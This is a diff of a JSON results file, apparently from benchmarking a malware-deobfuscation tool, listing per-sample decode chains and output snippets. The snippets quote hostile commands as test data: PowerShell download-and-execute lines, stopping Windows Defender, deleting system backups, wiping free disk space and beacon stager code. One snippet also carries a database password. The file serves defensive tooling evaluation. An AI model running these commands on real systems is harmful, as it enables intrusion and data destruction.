@@ -1,84 +1,302 @@
 {
-  "total": 11,
-  "passed": 0,
-  "hit_rate": 0.0,
+  "total": 32,
+  "passed": 12,
+  "hit_rate": 0.375,
   "threshold": 0.6,
   "results": [
     {
       "sha1": "7e0a722888e2f08b7a5e932db6a91dca4856fb77",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "powershell -Enc SQBFAFgA",
+      "output_head": "IEX",
       "ok": false
     },
     {
       "sha1": "fed5658f139d347e38b79f63e7769e6e90017c11",
-      "engine": "magic",
-      "chain": [],
-      "output_head": "random-noise-not-encoded-abcdefghij12345",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "base64-decode"
+      ],
+      "output_head": "\u00ad\u00a9\u00dd\u00a2o\u00a7\u00a2+\u001e\u00faz-\u00f9\u00e9\u00dc\u00a1\u00d7\u009d\u00f9\u00a6\u00dcu\u00e7\u00e0\u0086(\u00f5\u00db~9",
+      "ok": true
     },
     {
       "sha1": "ffe2866c6b8664a52af4d5d13be0dee25e8ea938",
-      "engine": "magic",
-      "chain": [],
-      "output_head": "powershell -c IEX(iwr http://malicious-test-domain.top/x); Invoke-Expression $(cmd /c 'nslookup 45.148.10.181')",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "extract-payload",
+        "ioc-extract"
+      ],
+      "output_head": "nslookup 45.148.10.181')",
+      "ok": true
     },
     {
       "sha1": "5a0f8e7798e03b81b53c2bddb1f5a5f65610c249",
-      "engine": "magic",
-      "chain": [],
-      "output_head": "powershell -c \"IEX(iwr http://malicious-test-domain.top/x); connect 45.148.10.181\"",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "ioc-extract"
+      ],
+      "output_head": "IEX(iwr http://malicious-test-domain.top/x); connect 45.148.10.181",
+      "ok": true
     },
     {
       "sha1": "70db2df97b3e88c66c50ef9df98dc51de491cc7d",
-      "engine": "magic",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "aGVsbG8=",
+      "output_head": "hello",
       "ok": false
     },
     {
       "sha1": "014a88cd1c3ec428bd2cbf2a49cc96ca8ad1ad0f",
-      "engine": "magic",
-      "chain": [],
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "crypto-detect",
+        "ioc-extract"
+      ],
       "output_head": "\"--dbname=postgresql://enteliweb:n3wenteli878wb12e4b2@127.0.0.1:49900/enteliweb --column-inserts --data-only --disable-t",
       "ok": false
     },
     {
       "sha1": "b6796e78f381654372d4cbd154fb8f9f7444c775",
-      "engine": "magic",
-      "chain": [],
-      "output_head": "GcAQQBDAEEAQQBKAEEAQgBqAEEEASABjAEEEAZAB3AEIAbwBBAEcAVQBBAFkAZwBBADkAQQBBDAFEAQQBBAaFEAQGRAAAEA",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "base64-decode",
+        "xor-brute",
+        "ps-reconstruct"
+      ],
+      "output_head": "}\u00a4t$t\u00a4t$t$v\u00e4t$t\u00e4~\u00e4t%d,d\u0007d%`e\u00f4e\u00b8ele\u00d8e`exe0e`e\u0000e\u00f8e`d\u0080e`e`Tat`t`t~p$t}tdd$",
+      "ok": true
     },
     {
       "sha1": "0fadbf25f40d74494cfab4a1a3f006bdb9316085",
-      "engine": "magic",
-      "chain": [],
-      "output_head": "AZTEIBUHEQDKMZAGQ4CAMZSEA2DSIBVGQQDKMJAGMZCANBZEA2TEIBVGIQDGMRAGQ4SANJTEA2TGIBTGIQDIOJAGUYCAN",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "base32-decode",
+        "nibble-swap",
+        "base91-decode",
+        "xor-brute",
+        "xor-brute"
+      ],
+      "output_head": "/<\u009c \u001d6\u00d5\u009a~\u00a4\u00af\u0089\u0084\u00fb\u009b\u008b\u00e6-,\u00d9\u0088iExE\u0011a\u008d9=>d\u00f2\u0015\u00f5B\u00fa TIT\u0092 {^k\u0091",
+      "ok": true
     },
     {
       "sha1": "d407c04e0b7193668b3f5f1624d5530a3ca6b37b",
-      "engine": "magic",
-      "chain": [],
-      "output_head": "cmd.exe /c whoami",
-      "ok": false
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload"
+      ],
+      "output_head": "whoami",
+      "ok": true
     },
     {
       "sha1": "191925ecaf3e468af6a3eae576835bef29ee77cd",
-      "engine": "magic",
-      "chain": [],
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract"
+      ],
       "output_head": "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nAll your important documents, photos, databases and other files have been encrypt",
       "ok": false
     },
     {
       "sha1": "d92873833e6ffd2b917d36eb547d1422107601c3",
-      "engine": "magic",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload"
+      ],
+      "output_head": "sc.exe stop WinDefend",
+      "ok": true
+    },
+    {
+      "sha1": "6c06f9eff8f4c60622f7eb107e8564af1892d07e",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract"
+      ],
+      "output_head": "# RC4-encoded payload with hardcoded key: 'hardcoded-rc4-key-1'\n# recovered plaintext: 'http://rc4-1.example.test/x'",
+      "ok": false
+    },
+    {
+      "sha1": "426951616d42ea71b5010516cd9cc0ac9be7de42",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract"
+      ],
+      "output_head": "# RC4-encoded payload with hardcoded key: 'hardcoded-rc4-key-2'\n# recovered plaintext: 'http://rc4-2.example.test/y'",
+      "ok": false
+    },
+    {
+      "sha1": "a8f14303bb3be565ccccd7ea34da1d803a11a3c1",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-1.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "22d3fd0fb38798a4633879978bfb61f44fbfc113",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-2.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "08de7c986951e592a2dd1936794c30a1b8727537",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-3.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "3b7cbc6a28d701250d07666f176f840baa77dc7d",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-4.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "8abd5cee3640503dac144e46795ed3c21219a885",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "output_head": "http://refl-5.example.test/asm.bin",
+      "ok": true
+    },
+    {
+      "sha1": "89593f33db457d7c5bef74b250c3a1eb672ee0a6",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-1.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "b69f2ac1751abddb95e15f42a76f42186893f29e",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-2.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "ff9d05e171379a9def0ce47405dcd0dfd98a1299",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-3.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "48f3e01d3d08a9dceee801e9b80868d10336faea",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-4.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "af8903991fd9ceb7d4bdff507a9ec4cfdb32ec1e",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "output_head": "# stager fetch: http://sc-5.example.test/beacon\n$b=[System.Convert]::FromBase64String($enc); $p=[Kernel32]::VirtualAlloc",
+      "ok": false
+    },
+    {
+      "sha1": "ae757110d8a75c8a3a702187a2e906a01c8dda30",
+      "engine": "llm-l3",
       "chain": [],
-      "output_head": "powershell -w hidden -c \"sc.exe stop WinDefend\"",
+      "output_head": "SELECT id, name FROM users WHERE active = 1;",
+      "ok": false
+    },
+    {
+      "sha1": "8064f1b8d1e57ae9b384076d70eeed9b47ac6bf4",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "2025-02-14T12:34:56Z INFO service started",
+      "ok": false
+    },
+    {
+      "sha1": "113cea36a6da4c4bc8627039b4f3d067aca2c4e1",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "import numpy as np\ndata = np.zeros((10, 10))",
+      "ok": false
+    },
+    {
+      "sha1": "ea55504afa6416b4f4b89ac4cc386c575f00929a",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract"
+      ],
+      "output_head": "192.168.1.1 is on the LAN \u2014 safe internal address",
+      "ok": false
+    },
+    {
+      "sha1": "272a202c058813509ca4b959cc41ec6ed8834131",
+      "engine": "rc2-orchestrator",
+      "chain": [
+        "ioc-extract"
+      ],
+      "output_head": "email me at john.doe@example.com if you have questions",
+      "ok": false
+    },
+    {
+      "sha1": "2aae6c35c94fcfb415dbe95f408b9ce91ee846ed",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "hello world",
+      "ok": false
+    },
+    {
+      "sha1": "c7a19cb10c70666f0a4299b85692e11b6c8b2f1b",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "wbadmin delete systemstatebackup -keepversions:0",
+      "ok": false
+    },
+    {
+      "sha1": "eb32fe579f52b910a0bcb15c09d78747b6d0e34f",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "cipher /w:C:\\",
+      "ok": false
+    },
+    {
+      "sha1": "1584af34536103c086f163f599640acbb9f26155",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "whoami && netstat -ano",
       "ok": false
     }
   ]
